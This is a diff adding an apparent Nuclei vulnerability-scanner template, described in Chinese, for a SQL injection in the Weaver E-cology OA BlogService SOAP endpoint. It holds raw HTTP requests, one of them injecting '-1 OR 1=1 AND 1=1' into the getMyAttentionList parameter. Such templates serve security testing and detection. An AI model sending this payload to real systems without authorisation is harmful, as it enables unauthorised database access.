@@ -1,0 +1,63 @@
+id: ecology-blogservice-sqli
+
+info:
+  name: 泛微 E-cology BlogService注入漏洞
+  author: 折跃
+  description: |-
+    泛微 E-cology BlogService SQL注入漏洞
+    泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台，e-cology可形成一系列的通用解决方案和行业解决方案。
+
+    泛微 E-cology中存在SQL注入漏洞，攻击者可利用该漏洞执行SQL语句，对数据库中的信息进行查看、添加、修改或删除。
+  severity: high
+  tags: 泛微-协同办公OA
+
+http:
+  - raw:
+      - |
+        POST /services/BlogService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Soapaction: ""
+
+        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="webservices.blog.weaver.com.cn" xmlns:urn2="http://blog.weaver" xmlns:urn3="http://webservices.blog.weaver">
+        <SOAP-ENV:Header/>
+        <SOAP-ENV:Body>
+          <urn:getMyAttentionList>
+            <urn:in0></urn:in0>
+          </urn:getMyAttentionList>
+        </SOAP-ENV:Body>
+        </SOAP-ENV:Envelope>
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<deptName>"
+  
+  - raw:
+      - |
+        POST /services/BlogService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Soapaction: ""
+
+        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="webservices.blog.weaver.com.cn" xmlns:urn2="http://blog.weaver" xmlns:urn3="http://webservices.blog.weaver">
+        <SOAP-ENV:Header/>
+        <SOAP-ENV:Body>
+          <urn:getMyAttentionList>
+            <urn:in0>-1 OR 1=1 AND 1=1</urn:in0>
+          </urn:getMyAttentionList>
+        </SOAP-ENV:Body>
+        </SOAP-ENV:Envelope>
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<deptName>"
